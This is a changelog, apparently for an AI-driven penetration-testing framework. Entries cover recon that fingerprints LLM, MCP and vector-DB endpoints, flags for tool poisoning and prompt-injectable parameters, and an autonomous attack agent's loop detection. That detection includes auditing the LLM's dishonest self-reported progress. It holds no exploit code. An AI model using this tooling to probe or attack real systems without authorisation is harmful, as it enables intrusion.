- **Productivity loop wrongly pushed agents off correct-but-failing approaches** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py), [agentic/prompts/base.py](agentic/prompts/base.py), [agentic/state.py](agentic/state.py)) — the unproductive-streak detector treated *debugging* (a fix attempt that adds no new target fact, or whose output merely contains "error") as no-progress, prematurely forcing the agent to pivot. Added a `diagnostic_progress` verdict and stall-counter handling: a same-approach re-attempt with a genuinely different result (or a cited ruled-out cause) now resets the stall counter instead of fuelling the streak, capped (`DIAGNOSTIC_PROGRESS_MAX_STREAK`, default 6) so a dead approach still surfaces. Repeat-detection now keys on output fingerprint, so structurally-similar payloads with different responses count as real attempts. The diagnose-or-pivot prompts now demand one validation step (reproduce / fingerprint / cite a tested assumption) before abandoning a technique. Coverage: [agentic/tests/test_productivity.py](agentic/tests/test_productivity.py).

---

## [4.15.0] - 2026-06-05

### Added

- **AI Surface Recon — active AI/LLM/MCP/vector-DB fingerprinting** ([recon/main_recon_modules/ai_surface_recon.py](recon/main_recon_modules/ai_surface_recon.py), [recon/helpers/probe_pack_engine.py](recon/helpers/probe_pack_engine.py), [graph_db/mixins/recon/ai_surface_recon_mixin.py](graph_db/mixins/recon/ai_surface_recon_mixin.py)) — new recon module (display **Phase 4.5**, after resource enumeration) that sends benign, protocol-aware probes to confirm and characterize the AI surfaces earlier passive phases only flagged. Seven independently-toggled workloads run per host (hosts in parallel, workloads sequential): (1) chat-shape probe — confirms an LLM endpoint + dialect + streaming + p50 latency without a key (a `401`/`422` OpenAI-style error body is a positive); (2) MCP handshake + `tools/list` + Cisco YARA static scan — enumerates the tool surface unauthenticated and flags tool-poisoning / prompt-injection; (3) OpenAPI / `ai-plugin.json` / model-listing discovery; (4) Julius YAML probe-pack engine (Praetorian matcher reimplemented in Python) for runtime fingerprints; (5) vector-DB confirmation reads (qdrant / chroma / weaviate / milvus) that double as an unauthenticated-exposure signal. It is black-box and benign — no jailbreaking, injection, or credentials, and **zero LLM calls**. Writes `ai_*` property annotations onto existing `Endpoint` / `Parameter` / `Technology` nodes (COALESCE-merged, zero new labels) plus MCP tool-poisoning `Vulnerability` nodes. 15 new project settings + Prisma columns, stealth-aware. Has an on-demand partial-recon twin. Heavy deps (`mcp`, `yara`, `prance`, `jq`, `PyYAML`) are lazy-imported so a missing library degrades one workload, not the run. Docs: [readmes/AI_SURFACE_RECON_MODULE.md](readmes/AI_SURFACE_RECON_MODULE.md) + wiki [Adversarial AI Recon](https://github.com/samugit83/redamon/wiki/Adversarial-AI-Recon#ai-surface-recon-active-probing). Coverage: [recon/tests/test_ai_surface_recon_module.py](recon/tests/test_ai_surface_recon_module.py), [test_ai_surface_recon_mixin.py](recon/tests/test_ai_surface_recon_mixin.py), [test_ai_surface_catalog.py](recon/tests/test_ai_surface_catalog.py), [test_probe_pack_engine.py](recon/tests/test_probe_pack_engine.py).

- **AI Surface & AI Risk graph tables** ([webapp/src/app/graph/components/RedZoneTables/AiTables.tsx](webapp/src/app/graph/components/RedZoneTables/AiTables.tsx), [aiSurface/route.ts](webapp/src/app/api/analytics/redzone/aiSurface/route.ts), [aiRisk/route.ts](webapp/src/app/api/analytics/redzone/aiRisk/route.ts)) — two new Data Table presets in the Red Zone dropdown that turn the new `ai_*` enrichment into operator views. **AI Surface** (inventory) aggregates every AI / LLM / MCP / vector-DB surface across all modules into 5 sub-sheets (LLM Endpoints, MCP Servers, AI Technologies, Vector DBs, Model Inventory); **AI Risk** (offensive, OWASP-LLM / MITRE ATLAS) surfaces the attackable findings in 5 sub-sheets (MCP Tool Poisoning, Injectable Params, RAG Ingestion, Exposed Runtimes, Unauthenticated MCP). Both reuse the shared red-zone shell (per-sheet search, refresh, XLSX / JSON / MD export). Coverage: [aiTablesRoutes.test.ts](webapp/src/app/api/analytics/redzone/aiTablesRoutes.test.ts), [AiTables.test.tsx](webapp/src/app/graph/components/RedZoneTables/AiTables.test.tsx).

### Fixed

- **Agent crash-loop** — the new graph mixin imported `recon` at module load; the agent image has no `recon` package. Made the import lazy.
- **Anthropic provider test 404** — the test hardcoded a retired model snapshot; now uses `claude-opus-4-6`.
- **No-provider project create** — the LLM-provider gate now shows immediately on Create (and on Save), instead of the form flashing first then a broken model picker.

---

## [4.14.1] - 2026-06-04

### Fixed

- **Custom Ports ignored, phantom 443/9000 nodes** ([recon/main_recon_modules/http_probe.py](recon/main_recon_modules/http_probe.py)) — when Naabu found no open ports, http_probe's DNS fallback probed a hardcoded port list (80, 443, 8080, 9000, ...) regardless of `NAABU_CUSTOM_PORTS`, so a custom-port scan invented out-of-scope nodes and never probed the requested port. The fallback now probes only the configured custom ports, plus a hard port-scope guard drops any out-of-scope URL before probing. Partial recon opts out (it scopes ports via its own modal injection). The form now shows a red warning that Top Ports is ignored when Custom Ports is set. Fixes [#136](https://github.com/samugit83/redamon/issues/136). Coverage: [recon/tests/test_custom_port_scope.py](recon/tests/test_custom_port_scope.py).

---

## [4.14.0] - 2026-05-29

### Added

- **ZAP Ajax Spider — browser-driven resource enumeration** ([recon/helpers/resource_enum/zap_ajax_spider_helpers.py](recon/helpers/resource_enum/zap_ajax_spider_helpers.py), [recon/main_recon_modules/resource_enum.py](recon/main_recon_modules/resource_enum.py), [recon/partial_recon_modules/web_crawling.py](recon/partial_recon_modules/web_crawling.py)) — new active crawler in GROUP 5 that runs OWASP ZAP with headless Firefox to capture endpoints static crawlers miss: JS-only XHRs, runtime-templated URLs, `history.pushState` SPA routes, click-cascade reveals, GraphQL POSTs, form submissions, and authenticated post-login surface via Replacer-injected headers. Off by default, auto-disabled in stealth mode, enabled in 4 presets (api-security, bug-bounty-deep, full-active-scan, web-app-pentester). 19 new project settings + Prisma columns. Validated end-to-end against guinea pig — all 13 expected discovery branches confirmed.

- **`Endpoint.sources[]` array** ([graph_db/mixins/recon/resource_mixin.py](graph_db/mixins/recon/resource_mixin.py)) — every Endpoint now carries a fine-grained crawler-attribution list (`katana`, `hakrawler`, `zap_ajax_spider`, etc.) in addition to the existing singular `source` phase tag. Union-not-clobber merge on overlap preserves history when multiple crawlers find the same endpoint. Enables queries like `MATCH (e:Endpoint) WHERE 'zap_ajax_spider' IN e.sources`.

### Fixed

- **Partial-recon scope filter broken for IP-mode projects** ([recon/partial_recon_modules/helpers.py](recon/partial_recon_modules/helpers.py), [recon/partial_recon_modules/web_crawling.py](recon/partial_recon_modules/web_crawling.py)) — `_host_in_requested_domain_scope` blindly applied a domain-match filter against the synthetic `ip-targets.<project_id>` pseudo-domain, pruning every legitimate localhost / RFC1918 / IPv6-loopback BaseURL as "out of scope". The ZAP partial recon then fell back to bare `localhost` (no port) and wrote 4 garbage endpoints per run. Introduced a shared `_is_host_in_scope` helper that honors `IP_MODE` + `TARGET_IPS`, accepts CIDR membership and IPv6 (bracketed `[::1]:port` and bare `2001:db8::1`), and falls back to "any private/loopback IP" when no targets are configured. 34 new unit tests cover every branch.

---

## [4.13.1] - 2026-05-28

### Fixed

- **JS Recon analysis hung indefinitely on large targets** ([recon/main_recon_modules/js_recon.py](recon/main_recon_modules/js_recon.py)): `_run_analysis()` wrapped the analyzer pool in `with ThreadPoolExecutor(...)`, so `future.result(timeout=...)` raised on time but the `with` exit then blocked on `shutdown(wait=True)` until every worker finished naturally. A 5894-file (303 MB) scan sat in `running` for 35+ minutes. Switched to manual executor with a shared wall-clock deadline and `shutdown(wait=False, cancel_futures=True)` in `finally`, so `JS_RECON_TIMEOUT` is now a real cap. Regression coverage: [recon/tests/test_js_recon_timeout.py](recon/tests/test_js_recon_timeout.py).

- **Generate Recon Preset with AI: 404 on non-Anthropic providers** ([webapp/src/app/api/presets/generate/route.ts](webapp/src/app/api/presets/generate/route.ts)) — the route was treating the suffix in `custom/<id>` as the upstream API model name, when it's actually a `UserLlmProvider` id. Now resolves the provider by id and uses `provider.modelIdentifier`, honoring `temperature` / `maxTokens` / `defaultHeaders` / `sslVerify` like the chat path. Fixes [#133](https://github.com/samugit83/redamon/issues/133).

- **Root-domain-only recon silently produced no targets** ([recon/main.py](recon/main.py)) — with Subdomain Discovery disabled and no prefixes set, the pipeline entered FULL DISCOVERY mode, skipped discovery, and never resolved the root domain, leaving downstream tools with zero targets. Now auto-promotes to FILTERED mode in that scenario so the root domain gets DNS-resolved and scanned. Fixes [#134](https://github.com/samugit83/redamon/issues/134).

### Changed

- **Target Configuration UX guardrails** ([webapp/src/components/projects/ProjectForm/sections/TargetSection.tsx](webapp/src/components/projects/ProjectForm/sections/TargetSection.tsx), [SubdomainDiscoverySection.tsx](webapp/src/components/projects/ProjectForm/sections/SubdomainDiscoverySection.tsx), [WorkflowView/WorkflowView.tsx](webapp/src/components/projects/ProjectForm/WorkflowView/WorkflowView.tsx), [WorkflowView/ToolNode.tsx](webapp/src/components/projects/ProjectForm/WorkflowView/ToolNode.tsx)) — UI now mirrors backend semantics so "no targets" states are unreachable:
  - When **Subdomain Discovery is OFF and prefixes are empty**, "Include Root Domain" is auto-enabled and locked ON (works in edit mode too).
  - When **explicit prefixes are set**, the Subdomain Discovery master toggle is auto-disabled and locked OFF in both the section view and the workflow diagram, with a hover tooltip explaining why; a new blue "Filtered mode" banner replaces the empty-prefixes warning.
  - Turning Subdomain Discovery OFF with empty prefixes now shows a confirm modal warning that Include Root Domain will be auto-enabled.

---

## [4.13.0] - 2026-05-27

### Added

- **Productivity v2: continuous score + tiered actions** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py), [state.py](agentic/state.py), [project_settings.py](agentic/project_settings.py)) — replaces the legacy binary `3 unproductive of last 6 → fire Deep Think` trigger with a continuous score that fuses five observed signals every think turn: unproductive verdicts, iterations since engagement state last grew, max axis-repeat count, same-pattern recent calls, minus rewards for recent `new_info` and actionable findings. Score maps to five tiers (green → yellow → orange → red → critical) with escalating prompt-level actions: soft hint → fire Deep Think → demand a hypothesis pivot → block the next expensive call on the dominant axis. Weights scale dynamically with session age and phase. Backward-compatible: `PRODUCTIVITY_SCORE_ENABLED=false` falls back to the legacy 3/6 counter.

- **Axis lock-in detector** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py)) — per-tool-family extractor (`extract_axis`) reduces every expensive call to the semantic dimensions the agent is *holding constant* (e.g. `(family=credential_brute_force, target=/login, fixed_user=admin)`), keyed into a session-long `tested_axes` ledger. Three brute-force attempts against the same username collapse onto a single axis key even when the wordlists differ — slow loops spread across 20+ iterations now register as repetition. Records on both the single-tool and wave analysis paths.

- **State-growth signal** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py), [think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — orchestrator-owned `_iterations_since_state_grew` counter resets to 0 whenever `target_info` / `chain_findings_memory` / `actionable_findings` grew, otherwise increments. Independent of LLM self-report; LLM cannot game it. Becomes the dominant input to the score once stall exceeds `STATE_GROWTH_SOFT_HINT_THRESHOLD` (default 5).

- **Deep Think cooldown** ([think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — after Deep Think fires, suppresses re-fires for `DEEP_THINK_COOLDOWN_ITERATIONS` (default 5). Bypassed by critical-tier score, state-growth-stall override, or LLM `_need_deep_think=true` self-request. Stops the "32 Deep Thinks in 60 minutes" failure mode where every same-window streak re-fired a fresh strategic analysis before the previous one had been acted on.

- **Deep Think novelty check** ([productivity.py](agentic/orchestrator_helpers/productivity.py), [think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — token-Jaccard similarity between the new `priority_order` and the previous one (stored in `_previous_priority_order`); if it exceeds `DEEP_THINK_NOVELTY_JACCARD_MAX` (default 0.6), a "plan novelty low" warning is prepended to the rendered Deep Think block, forcing the agent to articulate what specific parameter has changed or pivot to a strategy class not present in the previous plan.

### Changed

- **Deep Think trigger condition #3** is now score-tier-driven (`Productivity tier 'orange|red|critical' (score N.N) — components: {...}`) instead of the legacy "Unproductive streak detected (N/6 ...)". Tier-specific prompt hints (yellow / red / critical) are injected into the system prompt before the main think LLM call.

### Measured impact

- Single-target re-run, same model, same vulnerability chain: **−37% total tokens** (3.22M → 2.01M), **−35% wall time** (60m → 38m), **−63% Deep Thinks** (32 → 12, all genuinely needed), same flag recovered.

### Docs

- **README.AGENTIC_SYSTEM.md** ([readmes/README.AGENTIC_SYSTEM.md](readmes/README.AGENTIC_SYSTEM.md)) — Executive Summary rewritten with cognitive-scaffolding framing; *Deep Think* chapter gains new Cooldown and Novelty Check subsections; *Productivity Verdict & Loop Detector* chapter gains four new subsections (State-Growth Signal, Axis Lock-in Ledger, Continuous Productivity Score, Dynamic Weights); both flow diagrams rewritten to show the score → tier → action → cooldown → novelty pipeline.

### Tests

- 221 productivity tests total (133 in [test_productivity.py](agentic/tests/test_productivity.py), 88 in the new [test_productivity_v2_review.py](agentic/tests/test_productivity_v2_review.py)): axis extractor per tool family, ledger immutability, Jaccard edge cases, score boundary math, dynamic-weight scaling, tier mapping, cooldown arithmetic, full XBEN-007 timeline smoke, AST-grade wiring tests that lock the new statements in place across both the single-tool and wave analysis paths.


---


## [4.12.0] - 2026-05-24

### Added

- **Per-step diagnostic classification** ([agentic/orchestrator_helpers/error_class.py](agentic/orchestrator_helpers/error_class.py), [execute_plan_node.py](agentic/orchestrator_helpers/nodes/execute_plan_node.py), [execute_tool_node.py](agentic/orchestrator_helpers/nodes/execute_tool_node.py)) — every tool step is tagged with one of seven `error_class` values: `success`, `shell_parser_error`, `transport_error`, `tool_internal_error`, `application_4xx`, `application_5xx_fast` (<50ms — parse-time crash, input never reached business logic), `application_5xx_normal` (≥50ms — real app/DB error). The fast-vs-normal 5xx split is the key diagnostic that prevents the LLM from treating "all SQL payloads return 500" as "vector exhausted" when the input was actually rejected at the parser.

- **Inline `[duration_ms, error_class]` annotations in chain context** ([agentic/state.py](agentic/state.py)) — `_format_step_diagnostics()` surfaces both fields next to every tool entry the LLM reads, e.g. `execute_curl [3ms, application_5xx_fast]: ...`. Renders cleanly across the three chain-context paths (single-tool, wave, older-iteration digest); legacy steps without the fields render empty (backward-compatible).

- **Response-uniformity anomaly detector** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — complementary to the existing same-pattern fingerprint audit. When 5+ of the last 8 steps share the same `(error_class, body_size_bucket)` AND all complete in under 50ms, a warning block is injected into the next prompt: *"the test result is INCONCLUSIVE, not NEGATIVE — do not mark this vector class tested."* Each `error_class` carries its own remediation hint (shell-quoting streaks recommend `execute_code` over `execute_curl`; fast-5xx streaks recommend re-examining payload validity before pivoting). Tunable via `UNIFORM_RESPONSE_WINDOW` / `UNIFORM_RESPONSE_MIN_COUNT` / `UNIFORM_RESPONSE_DURATION_MS`.

- **Competing-hypotheses requirement in Deep Think** ([agentic/state.py](agentic/state.py), [agentic/prompts/base.py](agentic/prompts/base.py), [agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — `DeepThinkResult` gains a `competing_hypotheses: List[CompetingHypothesis]` field where each hypothesis carries `hypothesis`, `supporting_evidence` (cite specific iters/steps), and `disambiguating_probe` (ONE concrete test that distinguishes from the alternatives). The prompt requires ≥2 hypotheses when the trigger is "Unproductive streak detected" or when any chain finding has confidence ≥60. The rendered block leads the next iteration's prompt with the imperative *"do not just confirm your favorite"* — pushing the agent toward disambiguating probes instead of confirming its first plausible inference. Anti-confirmation-bias mechanism for the strategic re-evaluation loop.

- **Adversarial AI Phase 6 — JS Recon AI SDK detection** ([recon/helpers/ai_signal_catalog.py](recon/helpers/ai_signal_catalog.py), [recon/main_recon_modules/js_recon.py](recon/main_recon_modules/js_recon.py), [graph_db/mixins/recon/js_recon_mixin.py](graph_db/mixins/recon/js_recon_mixin.py)) — new 7th js_recon analysis pass scans every JS bundle for AI/LLM signals using a 164-pattern catalogue (65 SDK imports, 33+18 key literals, 3 browser flags, 23 frontend markers, 22 provider URLs). Writes `JsReconFinding` with 5 new `finding_type` values: `ai-sdk-client`, `ai-sdk-key-literal`, `ai-sdk-browser-allowed`, `ai-frontend-detected`, `ai-provider-url`. Constructor-context patterns suppress overlapping prefix matches (single finding per leaked key). Gemini disambiguation rule: `AIzaSy*` keys escalate to critical when paired with `@google/genai` / Gemini SDK / endpoint within ±2KB, otherwise downgrade to medium with "Maps/Firebase" label. Mixin enriches matching `Secret` nodes with `ai_provider` + `ai_finding_id`, gated on an AI-key-prefix whitelist so Stripe/Slack/AWS literals are never wrongly enriched. Gated by `jsReconAiSdkDetectionEnabled` (default on). 64 new unit/integration/smoke tests + 23 fixture JS files in [guinea_pigs/ai_surface_target/](guinea_pigs/ai_surface_target/) on port 9104 covering every detection branch including negative regression cases (jQuery, Stripe-only). Wiki: [Adversarial AI Recon § JS Recon AI SDK Detection](redamon.wiki/Adversarial-AI-Recon.md#js-recon-ai-sdk-detection).

- **Per-resource LLM model picker for Tradecraft Resources** ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma), [TradecraftResourceForm.tsx](webapp/src/components/settings/TradecraftResourceForm.tsx), [agentic/api.py](agentic/api.py)) — required `llmModel` on `UserTradecraftResource` picks which model crawls + summarizes each knowledge site, decoupling tradecraft from `Project.agentOpenaiModel`. Agent `/tradecraft/verify` honors an optional `model` field via the same provider-agnostic path the recon AI classifiers use.

### Fixed

- **Plan-wave path dropped diagnostic fields** ([agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — when `execute_plan_node` populated `duration_ms` and `error_class` on each wave step, `think_node` then rebuilt each step into a fresh `exec_step` dict that copied only a hand-picked field subset, silently dropping the two diagnostic fields before they reached the execution trace. P1/P2/P3 annotations never appeared for plan-wave iterations (~90% of the agent's traffic). Now propagated explicitly; wiring guard test (`test_think_node_plan_wave_propagates_diagnostics`) catches future regression.

- **`'list' object has no attribute 'strip'` crash on Bedrock Converse** ([tradecraft_crawl.py](agentic/orchestrator_helpers/tradecraft_crawl.py), [tradecraft_lookup.py](agentic/orchestrator_helpers/tradecraft_lookup.py), [agentic/api.py](agentic/api.py)) — eight LLM call sites called `.strip()` on `response.content`, which `ChatBedrockConverse` returns as a list of content blocks. Killed the tradecraft crawl loop and 502'd the five recon AI classifiers under Bedrock. All eight sites now route through `normalize_content()`.

### Docs

- **AI-Agent-Guide.md** ([redamon.wiki/AI-Agent-Guide.md](redamon.wiki/AI-Agent-Guide.md)) — "Deep Think Cards" section updated: trigger #3 rewritten from "3 consecutive failures" to the actual productivity-verdict-based sliding-window detection; output table grew from 5 to 6 sections with the new Competing Hypotheses row; new subsections on diagnostic annotations and the response-uniformity anomaly detector.

- **README.AGENTIC_SYSTEM.md** ([readmes/README.AGENTIC_SYSTEM.md](readmes/README.AGENTIC_SYSTEM.md)) — `DeepThinkResult` schema documentation refreshed with the new `competing_hypotheses` field and rendered-markdown example; "Diagnostic Annotations" and "Response-Uniformity Anomaly Detector" subsections added to the Productivity chapter; executive-summary entries #13 and #21 updated.


---


## [4.11.0] - 2026-05-23

### Added

- **Adversarial AI Surface Recon — distributed hooks across the recon pipeline** ([recon/helpers/ai_signal_catalog.py](recon/helpers/ai_signal_catalog.py), [domain_recon.py](recon/main_recon_modules/domain_recon.py), [port_scan.py](recon/main_recon_modules/port_scan.py), [masscan_scan.py](recon/main_recon_modules/masscan_scan.py), [nmap_scan.py](recon/main_recon_modules/nmap_scan.py), [http_probe.py](recon/main_recon_modules/http_probe.py)) — every standard recon module recognises AI-shaped signals (LLM runtimes, vector DBs, AI frontends, proxies, SDK clients, MLOps stacks) and attaches them to existing graph nodes. Black-box detection only; no extra HTTP traffic. Single source-of-truth catalogue covers 28 ports, 22 header families, 29 title regexes, 21 body fingerprints, 25 favicon hashes, 6 Nmap version patterns.

- **AI annotations on the graph** ([graph_db/mixins/recon/domain_mixin.py](graph_db/mixins/recon/domain_mixin.py), [port_mixin.py](graph_db/mixins/recon/port_mixin.py), [http_mixin.py](graph_db/mixins/recon/http_mixin.py)) — `Subdomain.ai_service_hint` from TXT/NS, `Service.ai_runtime_version` from Nmap, `Endpoint.is_ai_framework_detected` / `ai_framework_name` / `ai_frontend_product_guess` from httpx, `Technology.category` ∈ {`ai-runtime`, `ai-vector-db`, `ai-framework`, `ai-proxy`, `ai-frontend`, `ai-sdk-client`, `ai-mlops`}, `USES_TECHNOLOGY.detected_by` carries the signal channel (`naabu-ai-port`, `masscan-ai-port`, `httpx-ai-header`, `httpx-ai-favicon`, `httpx-ai-title`). Zero new node labels.

- **BaseURL → Endpoint model split** ([graph_db/mixins/recon/http_mixin.py](graph_db/mixins/recon/http_mixin.py)) — `BaseURL` is now one node per scheme+host+port; each probed path becomes an `Endpoint` keyed by `(path, method, baseurl)` linked via `(BaseURL)-[:HAS_ENDPOINT]->(Endpoint)`. Per-path response data and the `USES_TECHNOLOGY` edge from http_probe live on `Endpoint`, so a host serving a chat UI on `/` and a runtime API on `/v1/chat/completions` keeps two distinct AI-tagged endpoints under one BaseURL.

- **Two-tier port-catalog promotion** ([recon/main_recon_modules/port_scan.py](recon/main_recon_modules/port_scan.py), [masscan_scan.py](recon/main_recon_modules/masscan_scan.py)) — vendor-specific AI ports (Ollama 11434, Qdrant 6333/6334, Milvus 19530, ComfyUI 8188, Streamlit 8501, Gradio 7860, Argilla 6900, Kokoro-TTS 8880, SGLang 30000, LangGraph 2024) auto-promote to `Technology(ai-*)` from port output alone. Generic-but-AI-capable ports (1234, 3000, 3001, 4000, 5000, 5001, 6006, 7865, 8000, 8001, 8002, 8080, 8081, 8123, 8265, 9091, 50051) carry a `disambiguate=True` flag — port-scan skips them; promotion happens only if http_probe corroborates via header/title/favicon. Prevents false-positive AI tags on Tomcat/Phoenix/Node-dev/Prometheus-pushgateway boxes.

- **AI Wappalyzer body fingerprints** ([recon/main_recon_modules/http_probe.py](recon/main_recon_modules/http_probe.py)) — Wappalyzer-style regex catalogue scans the captured response body (≤ 512 KB) for AI-product signatures: `<gradio-app>` + `window.gradio_config`, `txt2img_textarea` (A1111), `fooocus_v2`, `invoke-favicon.svg`, `aria-label="Loading ComfyUI"`, `mlflow-ui-container`, Weaviate `/v1/meta` shape, Chroma `nanosecond heartbeat`, SGLang `/get_model_info`, KoboldCpp `"result":"KoboldCpp"`, LocalAI `/models/apply`, `@anthropic-ai/sdk` import, `dangerouslyAllowBrowser: true`. Fires only if no higher-priority channel (header / favicon / title) already won.

- **AWS Bedrock long-term API key authentication** ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma), [LlmProviderForm.tsx](webapp/src/components/settings/LlmProviderForm.tsx), [llm_setup.py](agentic/orchestrator_helpers/llm_setup.py), [model_providers.py](agentic/orchestrator_helpers/model_providers.py)) — Bedrock provider now supports a second auth mode alongside IAM keys: a long-term Bedrock API key (bearer token, generated in the Bedrock console under API keys -> Long-term API keys). New `awsBearerToken` column on `UserLlmProvider`, segmented control in the provider form, mutually exclusive at save time. Backend prefers `bedrock_api_key=` on `ChatBedrockConverse` when set, otherwise falls back to SigV4 with the IAM key + secret. Propagated through all 8 `setup_llm` call sites (main agent, fireteam orchestrator, all five `/llm/*` recon endpoints, RoE parse, report summarizer, tradecraft verify, text-to-cypher, both CypherFix orchestrators) plus `fetch_bedrock_models` (boto3 reads `AWS_BEARER_TOKEN_BEDROCK` env, set transiently under a lock). Short-term API keys intentionally not supported — they expire with the AWS console session and would break unattended scans.

- **Endpoint AI Classifier in the recon pipeline** ([recon/helpers/ai_signal_catalog.py](recon/helpers/ai_signal_catalog.py), [recon/main_recon_modules/resource_enum.py](recon/main_recon_modules/resource_enum.py), [graph_db/mixins/recon/resource_mixin.py](graph_db/mixins/recon/resource_mixin.py)) — cross-cutting classifier that runs after the URL discovery tools (Katana, Hakrawler, GAU, FFuf, ParamSpider, Arjun, Kiterunner, jsluice) and tags every Endpoint with `ai_interface_type` (8-value enum: `llm-chat`, `llm-completion`, `llm-embedding`, `llm-tool-call`, `sse-stream`, `mcp`, `llm-graphql`, `non-llm`), `is_ai_rag_ingest`, and every Parameter with `is_ai_prompt_injectable`. Path catalogue covers 38 vendor-specific routes (OpenAI, Anthropic, Gemini, Cohere, Mistral, Groq, Fireworks, Together, DeepSeek, Perplexity, Ollama, TGI, LangServe, MCP); RAG catalogue covers OpenAI Vector Stores / Assistants, Pinecone, Weaviate, Qdrant plus 7 ambiguous paths gated on parent-host being AI-tagged; param catalogue covers 23 prompt-injection field names cited from vendor request-body schemas. Pure regex, no extra traffic.

- **Dedicated workflow-view node** ([webapp/src/components/projects/ProjectForm/WorkflowView/workflowDefinition.ts](webapp/src/components/projects/ProjectForm/WorkflowView/workflowDefinition.ts), [nodeMapping.ts](webapp/src/components/projects/ProjectForm/nodeMapping.ts), [WorkflowNodeModal.tsx](webapp/src/components/projects/ProjectForm/WorkflowView/WorkflowNodeModal.tsx), [inputLogicTooltips.tsx](webapp/src/components/projects/ProjectForm/WorkflowView/inputLogicTooltips.tsx)) — new "Endpoint AI Classifier" node in group 5 (resource_enum stage), positioned downstream of the 8 URL-discovery tools and upstream of the Endpoint + Parameter data pills. Dotted "enriches" edges into both data nodes; consumes Endpoint + Parameter + BaseURL.

- **Project Settings "Resource Enum — AI Classifier" section** ([webapp/src/components/projects/ProjectForm/sections/ResourceEnumAiSection.tsx](webapp/src/components/projects/ProjectForm/sections/ResourceEnumAiSection.tsx)) — master toggle + 4 sub-toggles (AI Path Classifier, AI RAG Path Flag, AI Prompt-Injectable Param Flag, AI Tool-Arg Path Resolver), all default on. Sub-toggles visually disable when master is off. 9-layer settings flow plumbed end-to-end ([Prisma](webapp/prisma/schema.prisma), [project_settings.py](recon/project_settings.py), `/defaults`, Zod schema in [recon-preset-schema.ts](webapp/src/lib/recon-preset-schema.ts), RECON_PARAMETER_CATALOG, frontend section).

- **Partial recon for the Endpoint AI Classifier** ([recon/partial_recon_modules/endpoint_ai_classification.py](recon/partial_recon_modules/endpoint_ai_classification.py), [recon/partial_recon.py](recon/partial_recon.py), [webapp/src/lib/recon-types.ts](webapp/src/lib/recon-types.ts), [PartialReconModal.tsx](webapp/src/components/projects/ProjectForm/WorkflowView/PartialReconModal.tsx)) — operators can re-classify every existing Endpoint in the graph without re-crawling. Useful when the catalogue is extended, when toggles were off during the original scan, or when a new lap of AI annotations ships. No traffic to the target — reads the graph, runs the same classifier as the full pipeline, writes the AI annotations back via the mixin.

- **AI Surface section in pentest reports** ([webapp/src/lib/report/reportData.ts](webapp/src/lib/report/reportData.ts), [reportTemplate.ts](webapp/src/lib/report/reportTemplate.ts), [route.ts](webapp/src/app/api/projects/[id]/reports/route.ts)) — new `queryAiSurface` Cypher rollup, `renderAiSurface` HTML section with KPI cards (AI endpoints, RAG ingest endpoints, prompt-injectable params) and a per-endpoint detail table (top 50), and a `condenseForAgent` payload that ships the top 15 endpoints to the LLM for narrative generation. Risk-score contribution: 5 pts per AI endpoint, 15 pts per RAG ingest, 25 pts per prompt-injectable param.


---


## [4.10.1] - 2026-05-17

### Added

- **Productivity-based loop detection** ([agentic/orchestrator_helpers/productivity.py](agentic/orchestrator_helpers/productivity.py), [agentic/state.py](agentic/state.py), [agentic/prompts/base.py](agentic/prompts/base.py)) — every tool output is classified by the LLM into one of five verdicts (`new_info` / `confirmation` / `no_progress` / `blocked` / `duplicate`) with mandatory `what_was_new` citation. The orchestrator audits the claim against actual state delta (chain_findings growth, extracted_info population) and auto-downgrades dishonest verdicts to `no_progress`, surfacing the reason in the next prompt. A same-pattern fingerprint audit (sha256 over normalized response body) is appended when 3+ recent calls share the same tool-and-args shape, making repeated "confirmation" claims visibly dishonest.

- **Unproductive-streak Deep Think trigger** ([agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py), [agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py), [agentic/project_settings.py](agentic/project_settings.py)) — replaces the legacy "3 consecutive failures" rule. When `UNPRODUCTIVE_STREAK_THRESHOLD` (default 3) of the last `PRODUCTIVITY_AUDIT_WINDOW` (default 6) steps are unproductive (LLM verdict OR keyword-failure), Deep Think fires and a pivot warning is injected. Catches "successful but useless" loops (HTTP 200 with empty body, identical fuzzing fingerprints, stable 404s, polite WAF HTML) that the keyword-only detector missed. Mirrored in fireteam member subgraphs.

- **Workspace-path guidance for persistent state files** ([agentic/prompts/base.py](agentic/prompts/base.py)) — prompt now instructs the agent to write curl cookie jars, sqlmap output dirs, hydra restore files under `__WORKSPACE_ROOT__/notes/` instead of `/tmp`, so `fs_read` / `fs_grep` / `fs_edit` can reach them and they persist across kali-sandbox restarts.

### Fixed

- **Loop detector missed successful-but-useless calls** ([agentic/orchestrator_helpers/nodes/think_node.py](agentic/orchestrator_helpers/nodes/think_node.py)) — the old check only counted steps whose output contained `"failed"` / `"error"` / `"exploit completed, but no session"` AND required them to be consecutive, so empty-body 200s, repeated WAF-blocked HTML, and identical fuzzing iterations would never trip the pivot. Sliding-window N-of-K count over LLM-classified unproductive steps removes both gaps.


---


## [4.10.0] - 2026-05-15

### Added

- **Per-project workspace filesystem** ([docker-compose.yml](docker-compose.yml), [agentic/workspace_fs.py](agentic/workspace_fs.py)) — every project gets a persistent `/workspace/<projectId>/` bind-mount visible from the agent, the kali-sandbox, and the host. Auto-creates `notes/`, `tool-outputs/`, `jobs/`, `uploads/` on first access. All paths are validated against the project root (`..` traversal, absolute escape, symlink escape all rejected).

